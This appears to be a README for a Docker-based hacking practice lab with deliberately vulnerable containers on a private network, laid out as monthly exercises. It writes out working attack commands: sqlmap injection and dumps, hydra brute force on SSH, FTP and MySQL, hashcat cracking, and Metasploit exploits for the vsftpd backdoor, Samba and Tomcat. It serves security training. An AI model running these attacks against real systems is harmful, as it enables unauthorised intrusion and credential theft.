# Docker Lab

A lightweight hacking lab using Docker containers as intentionally vulnerable targets. No VMs needed — runs entirely on your Kali machine.

> **Legal Notice:** This lab is for educational purposes only. Only attack systems you own or have explicit permission to test.

---

## Architecture

```
┌─────────────────────────────────────────────────┐
│              Docker Network: kali-lab            │
│               Subnet: 172.20.0.0/24              │
│                                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────────┐  │
│  │  DVWA    │  │  WebGoat │  │ Metasploitable│  │
│  │172.20.0.20│  │172.20.0.30│  │ 172.20.0.40  │  │
│  │Port 80   │  │Port 8080 │  │ Many ports   │  │
│  └──────────┘  └──────────┘  └──────────────┘  │
│                                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────────┐  │
│  │  SSH     │  │  FTP     │  │  MySQL       │  │
│  │172.20.0.50│  │172.20.0.60│  │ 172.20.0.70  │  │
│  │Port 22   │  │Port 21   │  │ Port 3306    │  │
│  └──────────┘  └──────────┘  └──────────────┘  │
└─────────────────────────────────────────────────┘
         ↑ Attacker connects from host Kali
```

---

## Quick Start

```bash
# Start the entire lab
./lab.sh start

# Check lab status
./lab.sh status

# Stop all containers
./lab.sh stop

# Attack from isolated Kali container
./kali-attacker.sh

# Set up wordlists
sudo ./setup-wordlists.sh
```

---

## Lab Targets

| Container | IP | Ports | Vulnerabilities |
|-----------|-----|-------|----------------|
| DVWA | 172.20.0.20 | 80 | SQLi, XSS, CSRF, File Upload, Command Injection |
| WebGoat | 172.20.0.30 | 8080 | OWASP Top 10 interactive lessons |
| Metasploitable2 | 172.20.0.40 | many | vsftpd backdoor, Samba, UnrealIRCd, Tomcat |
| SSH target | 172.20.0.50 | 22 | Weak credentials (for brute force practice) |
| FTP target | 172.20.0.60 | 21 | Anonymous login, vsftpd |
| MySQL | 172.20.0.70 | 3306 | No-auth root access |

---

## Lab Exercises by Study Plan Month

### Month 1–2: Information Gathering
```bash
# Scan the entire lab network
nmap -sV -sC 172.20.0.0/24

# Enumerate DVWA
nmap -A 172.20.0.20

# Web directory brute force
gobuster dir -u http://172.20.0.20 -w /usr/share/wordlists/dirb/common.txt

# Subdomain/vhost discovery
ffuf -u http://172.20.0.20/FUZZ -w /usr/share/wordlists/dirb/big.txt
```

### Month 3–4: Web Application Testing
```bash
# DVWA credentials: admin / password
# Set security level to: Low

# SQL Injection
sqlmap -u "http://172.20.0.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session>; security=low" --dbs

# Directory brute force on DVWA
gobuster dir -u http://172.20.0.20/dvwa -w /usr/share/wordlists/dirb/common.txt -x php

# Scan with Nikto
nikto -h http://172.20.0.20

# WebGoat OWASP exercises
# Access: http://172.20.0.30:8080/WebGoat
# Register, then work through each lesson
```

### Month 5: Password Attacks
```bash
# SSH brute force (weak credentials target)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://172.20.0.50

# FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://172.20.0.60

# Crack hashes from DVWA MySQL dump
# First dump: sqlmap ... --dump
# Then: hashcat -a 0 -m 0 hashes.txt rockyou.txt

# MySQL brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://172.20.0.70
```

### Month 7: Exploitation with Metasploit
```bash
# Start msfconsole
msfconsole -q

# vsftpd 2.3.4 backdoor (Metasploitable2)
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.20.0.40
run

# Samba usermap_script
use exploit/multi/samba/usermap_script
set RHOSTS 172.20.0.40
run

# Tomcat manager (Metasploitable2, port 8180)
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 172.20.0.40
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
run
```

### Month 8: Sniffing
```bash
# Capture all lab traffic
docker network inspect kali-lab
# Note the bridge interface name (br-XXXXX)
tcpdump -i br-XXXXX -w lab_capture.pcap

# Open in Wireshark
wireshark lab_capture.pcap

# Generate interesting traffic first:
# - Do an FTP login to 172.20.0.60
# - Do an HTTP login to DVWA
# Then capture and find credentials in Wireshark
```

---

## Files in This Directory

| File | Purpose |
|------|---------|
| `docker-compose.yml` | Defines all lab containers and network |
| `lab.sh` | Lab management: start/stop/status/clean |
| `kali-attacker.sh` | Launch isolated Kali attacker container |
| `setup-wordlists.sh` | Set up wordlists (rockyou, SecLists) |

---

## Prerequisites

```bash
# Docker must be running
sudo systemctl start docker

# Add yourself to docker group (one-time)
sudo usermod -aG docker $USER
# Then log out and back in

# Start the lab
./lab.sh start
```

---

## Resetting the Lab

```bash
# Stop and remove all containers
./lab.sh clean

# Start fresh
./lab.sh start
```

This is useful after exploiting a target and wanting a clean state for a new exercise.
